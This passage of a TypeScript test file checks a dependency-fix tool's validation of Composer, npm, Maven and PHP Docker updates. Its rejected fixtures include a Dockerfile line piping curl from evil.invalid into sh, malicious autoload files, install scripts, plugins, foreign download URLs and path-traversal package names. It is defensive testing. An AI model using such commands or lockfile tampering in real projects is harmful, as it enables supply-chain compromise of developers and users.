      expect(branchAt(r.origin, "ludion/php/8.4.27")).toBe(outcome === "opened" ? made : "");
    }
  });
  /** A Composer project whose fix moves symfony/http-foundation 5.4.0 -> 5.4.54 and adds symfony/polyfill-php83, which 5.4.54 requires. */
  function composerFix() {
    const a = "a".repeat(40), b = "b".repeat(40), c = "c".repeat(40), lock = (packages: unknown[]) => `${JSON.stringify({ "content-hash": "1", packages, "packages-dev": [] }, null, 4)}\n`;
    const r = repository({
      "ludion.security.json": `${JSON.stringify({ schema: 1, ecosystem: "composer", image: "composer:2", test: ["php", "t.php"], timeout_seconds: 60 })}\n`,
      "composer.json": `${JSON.stringify({ name: "app/app", require: { "symfony/http-foundation": "5.4.0" } }, null, 2)}\n`,
      "composer.lock": lock([composerEntry("symfony/deprecation-contracts", "v2.5.0", a), composerEntry("symfony/http-foundation", "v5.4.0", b)]),
    });
    const manifestDir = mkdtempSync(join(tmpdir(), "ludion-deliver-cj-"));
    writeFileSync(join(manifestDir, "composer.json"), readFileSync(join(r.work, "composer.json")));
    const change = { name: "symfony/http-foundation", from: "5.4.0", to: "5.4.54", advisories: ["GHSA-x7x7-x7x7-x7x7"] };
    const planned = composerEntry("symfony/http-foundation", "v5.4.54", c, { require: { "symfony/polyfill-php83": "^1.27" } }), added = composerEntry("symfony/polyfill-php83", "v1.31.0", c);
    const json = changedManifest(manifestDir, "composer", [change]), fixedLock = lock([composerEntry("symfony/deprecation-contracts", "v2.5.0", a), planned, added]);
    const branch = "ludion/composer/symfony-http-foundation-5.4.54", subject = "ludion: symfony/http-foundation 5.4.0 -> 5.4.54 (composer)";
    const made = fixBranch(r.gitBase, branch, [{ path: "composer.json", content: json }, { path: "composer.lock", content: fixedLock }], `${subject}\n\nFixes GHSA-x7x7-x7x7-x7x7.\n\nLudion receipt ${ID}: the project's test passed on ${r.base.slice(0, 12)} and on this change alone, offline in Docker.\nSource dependency files only; production was not changed.\n`);
    const receipt = {
      schema: 2, id: ID, ecosystem: "composer", scope: "dependency_files_only_not_deployed", outcome: "applied", baseline_passed: true, base_commit: r.base,
      fixes: [{ package: change.name, changes: [change], outcome: "applied", branch, commit: made, candidate_passed: true, files: [{ path: "composer.json", before_hash: "", after_hash: sha256(json) }, { path: "composer.lock", before_hash: "", after_hash: sha256(fixedLock) }], fix_published_at: null, found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z" }],
    };
    return { r, branch, made, out: artifact(r.work, receipt, [`refs/heads/${branch}`], r.base), packagist: { [planned.name]: planned, [added.name]: added } as Record<string, Record<string, unknown>> };
  }
  it("Composer: each added or moved lock entry must be as Packagist lists it, and OSV must list nothing on the version moved to", async () => {
    for (const [change, outcome, why] of [
      [{}, "opened", ""],
      [{ "symfony/http-foundation": { dist: { type: "zip", url: `https://api.github.com/repos/symfony/http-foundation/zipball/${"d".repeat(40)}`, reference: "d".repeat(40), shasum: "" } } }, "failed", "dist for symfony/http-foundation@v5.4.54 is not what Packagist lists"],
      [{ "symfony/http-foundation": { autoload: { files: ["evil.php"] } } }, "failed", "autoload for symfony/http-foundation@v5.4.54 is not what Packagist lists"],
      // The added package, not only the planned one, is asked about.
      [{ "symfony/polyfill-php83": { autoload: { files: ["bootstrap.php"] } } }, "failed", "autoload for symfony/polyfill-php83@v1.31.0 is not what Packagist lists"],
      [{ osv: ["GHSA-1111-2222-3333"] }, "failed", "OSV lists GHSA-1111-2222-3333 for symfony/http-foundation@5.4.54"],
    ] as const) {
      const fix = composerFix(), asked: string[] = [], osvAsked: string[] = [], gh = github(fix.r.origin);
      const packagist = async (name: string, version: string) => { asked.push(`${name}@${version}`); return { ...fix.packagist[name], version_normalized: "x", ...(change as Record<string, unknown>)[name] as object }; };
      const osv = async (ecosystem: string, name: string, version: string) => { osvAsked.push(`${ecosystem}:${name}@${version}`); return "osv" in change ? [...change.osv] : []; };
      const result = await open(checkout(fix.r.origin), fix.out, fix.r.base, fix.r.origin, gh, "refs/heads/main", { packagist, osv });
      expect(osvAsked).toEqual(outcome === "opened" || "osv" in change ? ["Packagist:symfony/http-foundation@5.4.54"] : []);
      if (outcome === "opened") expect(asked.sort()).toEqual(["symfony/http-foundation@v5.4.54", "symfony/polyfill-php83@v1.31.0"]);
      expect(result.deliveries[0]).toMatchObject({ outcome, ...(why ? { reason: expect.stringContaining(why) } : {}) });
      expect(branchAt(fix.r.origin, fix.branch)).toBe(outcome === "opened" ? fix.made : "");
    }
  });
  it("reads Packagist only for a plain package name, and a hostile name is refused at once", async () => {
    const urls: string[] = [];
    const fetchFn = (async (url: string | URL | Request) => { urls.push(String(url)); return new Response(JSON.stringify({ minified: "composer/2.0", packages: { "symfony/http-foundation": [{ version: "v5.4.54", dist: { url: "x" } }, { version: "v5.4.53" }] } })); }) as typeof fetch;
    expect(await packagistRelease("symfony/http-foundation", "5.4.53", fetchFn)).toMatchObject({ version: "v5.4.53", dist: { url: "x" } });
    expect(await packagistRelease("symfony/http-foundation", "9.9.9", fetchFn)).toBeNull();
    expect(urls).toEqual(["https://repo.packagist.org/p2/symfony/http-foundation.json", "https://repo.packagist.org/p2/symfony/http-foundation.json"]);
    const started = performance.now();
    for (const name of [`a/${"0".repeat(200)}!`, "a b/c", "a/b?c", "../x/y", "a/b/c", `a/${"b".repeat(300)}`]) await expect(packagistRelease(name, "1.0.0", fetchFn)).rejects.toThrow("Invalid Composer package name");
    expect(performance.now() - started).toBeLessThan(1000);
    expect(urls).toHaveLength(2);
  });
  it("a branch with this fix's tree on an older base is left alone", async () => {
    const { work, origin, first, base } = project(), fix = applied(work);
    const tree = git(work, "rev-parse", `${fix.commit}^{tree}`);
    const older = spawnSync("git", ["commit-tree", tree, "-p", first, "-m", "older"], { cwd: work, encoding: "utf8", env: { ...process.env, GIT_AUTHOR_NAME: "Ludion", GIT_AUTHOR_EMAIL: "ludion@ludion.invalid", GIT_COMMITTER_NAME: "Ludion", GIT_COMMITTER_EMAIL: "ludion@ludion.invalid" } }).stdout.trim();
    git(work, "push", "-q", origin, `${older}:refs/heads/${BRANCH}`);
    const gh = github(origin), result = await open(checkout(origin), artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base), base, origin, gh);
    expect(result.deliveries[0]).toMatchObject({ outcome: "branch_differs" });
    expect(branchAt(origin, BRANCH)).toBe(older);
    expect(gh.opened).toHaveLength(0);
  });
});

describe("the policy at the base decides what a fix may change, and what it may say", { timeout: 30_000 }, () => {
  it("PHP: only the Dockerfile ludion.security.json names, with the subject, message and branch patch.ts gives", () => {
    const work = mkdtempSync(join(tmpdir(), "ludion-deliver-php-"));
    writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ schema: 1, dockerfile: "./Dockerfile", test: ["php", "tests/smoke.php"], timeout_seconds: 60 })}\n`);
    writeFileSync(join(work, "Dockerfile"), "FROM php:8.4.26-cli-alpine\nWORKDIR /app\n");
    const base = commit(work), copy = mkdtempSync(join(tmpdir(), "ludion-deliver-copy-"));
    snapshot(work, copy);
    const after = `FROM php:8.4.27-cli-alpine@sha256:${"1".repeat(64)}\nWORKDIR /app\n`;
    const made = fixBranch(gitBase(work, copy), "ludion/php/8.4.27", [{ path: "Dockerfile", content: after }], PHP_MESSAGE(base));
    const receipt = {
      schema: 1, id: ID, scope: "dockerfile_only_not_deployed", outcome: "applied", baseline_passed: true, candidate_passed: true, base_commit: base,
      scan: { current: { version: "8.4.26" }, candidate: { version: "8.4.27" }, security_releases: [{ version: "8.4.27", date: "23 Oct 2026" }] }, dockerfile_after: sha256(after),
      branch: "ludion/php/8.4.27", commit: made, fix_published_at: "2026-10-23T00:00:00.000Z", found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z",
    };
    const out = artifact(work, receipt, ["refs/heads/ludion/php/8.4.27"], base);
    const checked = checkArtifact(work, out, base);
    expect(checked.fixes).toMatchObject([{ package: "php", branch: "ludion/php/8.4.27", commit: made, files: [{ path: "Dockerfile" }] }]);
    expect(pullRequestBody(checked, checked.fixes[0]!)).toContain("PHP image updates do not go through Ludion's judge");
    // The same commit under a Composer policy: the Dockerfile is not a file a Composer fix may change.
    writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ schema: 1, ecosystem: "composer", image: "composer:2", test: ["php", "x"], timeout_seconds: 60 })}\n`);
    git(work, "commit", "-qam", "composer policy");
    const composerBase = git(work, "rev-parse", "HEAD");
    expect(() => checkArtifact(work, artifact(work, { ...receipt, base_commit: composerBase }, [], composerBase), composerBase)).toThrow("is not a composer dependency receipt");
  });
  const fixOf = (pkg: string, from: string, to: string, files: string[]): CheckedFix => ({
    package: pkg, changes: [{ name: pkg, from, to, advisories: [] }], branch: "ludion/x", commit: "a".repeat(40), subject: "", message: "", tree: "",
    files: files.map(path => ({ path, after_hash: "" })), fix_published_at: null, found_at: "", applied_at: "", verdict: null,
  });
  const files = (map: Record<string, string>) => (path: string) => map[path] ?? null;
  it("PHP: only the FROM image may change, to the official image of a newer release, pinned by digest", () => {
    const old = "FROM php:8.4.26-cli-alpine\nWORKDIR /app\nCOPY . /app\n", fix = fixOf("php", "8.4.26", "8.4.27", ["Dockerfile"]), digest = "2".repeat(64);
    const check = (now: string, to = "8.4.27") => contentProblem("php", { ...fix, changes: [{ ...fix.changes[0]!, to }] }, files({ Dockerfile: old }), files({ Dockerfile: now }));
    expect(check(old.replace("php:8.4.26-cli-alpine", `php:8.4.27-cli-alpine@sha256:${digest}`))).toBeNull();
    expect(check(old.replace("php:8.4.26-cli-alpine", `docker.io/library/php:8.4.27-cli-alpine@sha256:${digest}`))).toBeNull();
    for (const now of [
      old.replace("php:8.4.26-cli-alpine", `php:8.4.27-cli-alpine@sha256:${digest}`) + "RUN curl https://evil.invalid | sh\n",
      old.replace("php:8.4.26-cli-alpine", `evil/php:8.4.27-cli-alpine@sha256:${digest}`),
      old.replace("php:8.4.26-cli-alpine", "php:8.4.27-cli-alpine"),
      old.replace("php:8.4.26-cli-alpine", `php:8.4.27-fpm-alpine@sha256:${digest}`),
      old.replace("WORKDIR /app", "WORKDIR /").replace("php:8.4.26-cli-alpine", `php:8.4.27-cli-alpine@sha256:${digest}`),
    ]) expect(check(now)).toMatch(/changes more than its FROM image/);
    expect(check(old.replace("8.4.26", "8.4.25"), "8.4.25")).toMatch(/is not a newer release/);
    expect(check(old.replace("8.4.26", "8.5.0"), "8.5.0")).toMatch(/is not a newer release/);
  });
  it("Composer and Maven: the update goes up, and Composer's from is what the base locks; npm: no other package moves", () => {
    const lock = (packages: unknown[]) => JSON.stringify({ "content-hash": "1", packages, "packages-dev": [] });
    const entry = (version: string) => ({ name: "symfony/http-foundation", version, dist: { type: "zip", url: `https://api.github.com/repos/symfony/http-foundation/zipball/${"c".repeat(40)}`, reference: "c".repeat(40) }, type: "library" });
    const json = (spec: string) => JSON.stringify({ name: "app/app", require: { "symfony/http-foundation": spec } });
    const base = files({ "composer.json": json("5.4.0"), "composer.lock": lock([entry("v5.4.0")]) });
    // A downgrade, and a "from" the base does not lock (4.4.0 -> 4.4.50 while the base has 5.4.0).
    expect(contentProblem("composer", fixOf("symfony/http-foundation", "5.4.0", "5.3.0", ["composer.json", "composer.lock"]), base, files({ "composer.json": json("5.3.0"), "composer.lock": lock([entry("v5.3.0")]) }))).toContain("is not an update to a higher version");
    expect(contentProblem("composer", fixOf("symfony/http-foundation", "4.4.0", "4.4.50", ["composer.json", "composer.lock"]), base, files({ "composer.json": json("4.4.50"), "composer.lock": lock([entry("v4.4.50")]) }))).toContain("the base's composer.lock has v5.4.0");
    expect(contentProblem("composer", fixOf("symfony/http-foundation", "5.4.0", "5.4.54", ["composer.json", "composer.lock"]), base, files({ "composer.json": json("5.4.54"), "composer.lock": lock([entry("v5.4.54")]) }))).toBeNull();
    const pom = readFileSync(new URL("../../../examples/maven-security/pom.xml", import.meta.url), "utf8");
    expect(contentProblem("maven", fixOf("org.apache.commons:commons-lang3", "3.11", "3.10", ["pom.xml"]), files({ "pom.xml": pom }), files({ "pom.xml": pom }))).toContain("is not an update to a higher version");
    // npm: the lockfile moves only the fix's package; another package losing a version is refused, a new one is not.
    const npmLock = (packages: Record<string, unknown>) => JSON.stringify({ name: "app", lockfileVersion: 3, packages: { "": { name: "app", dependencies: { lodash: "4.17.21" } }, ...packages } });
    const pkg = JSON.stringify({ name: "app", dependencies: { lodash: "4.17.20" } }), fixedPkg = JSON.stringify({ name: "app", dependencies: { lodash: "4.17.21" } });
    const npmBase = files({ "package.json": pkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.20" }, "node_modules/minimist": { version: "1.2.6" } }) });
    const fix = fixOf("lodash", "4.17.20", "4.17.21", ["package.json", "package-lock.json"]);
    expect(contentProblem("npm", fix, npmBase, files({ "package.json": fixedPkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.21" }, "node_modules/minimist": { version: "1.2.6" }, "node_modules/new-dep": { version: "1.0.0" } }) }))).toBeNull();
    expect(contentProblem("npm", fix, npmBase, files({ "package.json": fixedPkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.21" }, "node_modules/minimist": { version: "1.2.8" } }) }))).toContain("moves minimist from 1.2.6, which this fix does not plan");
  });
  it("Maven: pom.xml is exactly what changedManifest makes for the change", () => {
    const pom = readFileSync(new URL("../../../examples/maven-security/pom.xml", import.meta.url), "utf8");
    const dir = mkdtempSync(join(tmpdir(), "ludion-deliver-pom-"));
    writeFileSync(join(dir, "pom.xml"), pom);
    const change = { name: "org.apache.commons:commons-lang3", from: "3.11", to: "3.18.0", advisories: [] };
    const expected = changedManifest(dir, "maven", [change]), fix = fixOf(change.name, change.from, change.to, ["pom.xml"]);
    expect(contentProblem("maven", fix, files({ "pom.xml": pom }), files({ "pom.xml": expected }))).toBeNull();
    const plugin = expected.replace("</project>", "<build><plugins><plugin><groupId>evil</groupId><artifactId>evil</artifactId></plugin></plugins></build></project>");
    expect(contentProblem("maven", fix, files({ "pom.xml": pom }), files({ "pom.xml": plugin }))).toMatch(/pom.xml is not what Ludion writes/);
  });
  it("Composer: composer.lock moves only the planned package, from a pinned archive, and adds no plugin", () => {
    const entry = (name: string, version: string, ref: string, extra: Record<string, unknown> = {}) => ({ name, version, dist: { type: "zip", url: `https://api.github.com/repos/${name}/zipball/${ref}`, reference: ref, shasum: "" }, type: "library", ...extra });
    const a = "a".repeat(40), b = "b".repeat(40), c = "c".repeat(40);
    const json = { name: "app", require: { "symfony/http-foundation": "5.4.0" } }, fixedJson = { name: "app", require: { "symfony/http-foundation": "5.4.54" } };
    const lock = (packages: unknown[]) => `${JSON.stringify({ _readme: ["x"], "content-hash": "1", packages, "packages-dev": [], "plugin-api-version": "2.6.0" }, null, 4)}\n`;
    const before = { "composer.json": JSON.stringify(json), "composer.lock": lock([entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.0", b)]) };
    const fix = fixOf("symfony/http-foundation", "5.4.0", "5.4.54", ["composer.json", "composer.lock"]);
    const after = (packages: unknown[], top: Record<string, unknown> = {}) => files({ "composer.json": JSON.stringify(fixedJson), "composer.lock": `${JSON.stringify({ _readme: ["x"], "content-hash": "2", packages, "packages-dev": [], "plugin-api-version": "2.6.0", ...top }, null, 4)}\n` });
    // The fix itself, with descriptive metadata changed on another package, a new dependency, and the newer Composer of
    // the tool image (examples/composer-security: plugin-api-version 2.9.0 -> 2.11.0).
    const fixed = entry("symfony/http-foundation", "v5.4.54", c, { require: { "symfony/polyfill-php83": "^1.27" } });
    expect(contentProblem("composer", fix, files(before), after([entry("symfony/deprecation-contracts", "v2.5.0", a, { "published-time": "2026-06-27T21:46:34+00:00" }), fixed, entry("symfony/polyfill-php83", "v1.31.0", c, { require: { "symfony/polyfill-mbstring": "^1" }, "notification-url": "https://packagist.org/downloads/" }), entry("symfony/polyfill-mbstring", "v1.31.0", c)], { "plugin-api-version": "2.11.0" }))).toBeNull();
    // The same package from another repository, a new package nothing requires, a notification-url (Composer calls it).
    for (const [packages, why] of [
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...fixed, dist: { type: "zip", url: `https://api.github.com/repos/evil/http-foundation/zipball/${c}` } }], "from another archive repository than the base did"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...fixed, source: { type: "git", url: "https://github.com/evil/http-foundation.git", reference: c } }], "changes where symfony/http-foundation comes from"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), fixed, entry("symfony/polyfill-php83", "v1.31.0", c), entry("evil/unrequired", "1.0.0", c)], "adds evil/unrequired, which the fixed version does not require"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), fixed, entry("symfony/polyfill-php83", "v1.31.0", c), entry("symfony/deprecation-contracts", "v2.5.0", "e".repeat(40))], "lists symfony/deprecation-contracts more than once"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), fixed, { ...entry("symfony/polyfill-php83", "v1.31.0", c), dist: { type: "zip", url: "https://evil.invalid/polyfill.zip" } }], "takes symfony/polyfill-php83 from outside the pinned public archives"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a, { "notification-url": "https://evil.invalid/ping" }), fixed, entry("symfony/polyfill-php83", "v1.31.0", c)], "changes symfony/deprecation-contracts"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), fixed, entry("symfony/polyfill-php83", "v1.31.0", c, { "notification-url": "https://evil.invalid/ping" })], "gives the new symfony/polyfill-php83 a notification-url other than Packagist's"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...fixed, scripts: { "post-install-cmd": "evil" } }, entry("symfony/polyfill-php83", "v1.31.0", c)], "gives symfony/http-foundation keys Ludion does not check (scripts)"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...fixed, "notification-url": "https://evil.invalid/ping" }, entry("symfony/polyfill-php83", "v1.31.0", c)], "changes symfony/http-foundation's notification-url"],
    ] as const) expect(contentProblem("composer", fix, files(before), after([...packages]))).toContain(why);
    for (const [packages, why] of [
      [[entry("symfony/deprecation-contracts", "v2.5.1", a), entry("symfony/http-foundation", "v5.4.54", c)], "changes symfony/deprecation-contracts"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a, { autoload: { files: ["evil.php"] } }), entry("symfony/http-foundation", "v5.4.54", c)], "changes symfony/deprecation-contracts"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.53", c)], "not to the fix's version"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...entry("symfony/http-foundation", "v5.4.54", c), dist: { type: "zip", url: "https://evil.invalid/x.zip" } }], "outside the pinned public archives"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.54", c), entry("evil/plugin", "1.0.0", c, { type: "composer-plugin" })], "a composer-plugin"],
      [[entry("symfony/http-foundation", "v5.4.54", c)], "removes symfony/deprecation-contracts"],
    ] as const) expect(contentProblem("composer", fix, files(before), after([...packages]))).toContain(why);
    expect(contentProblem("composer", fix, files(before), after([entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.54", c)], { repositories: [{ type: "vcs", url: "https://evil.invalid" }] }))).toContain("changes its repositories");
    // composer.json: only the planned requirement, raised as changedManifest raises it.
    const looser = files({ "composer.json": JSON.stringify({ ...fixedJson, scripts: { "post-install-cmd": "evil" } }), "composer.lock": before["composer.lock"] });
    expect(contentProblem("composer", fix, files(before), looser)).toContain("composer.json is not what Ludion writes");
  });
});
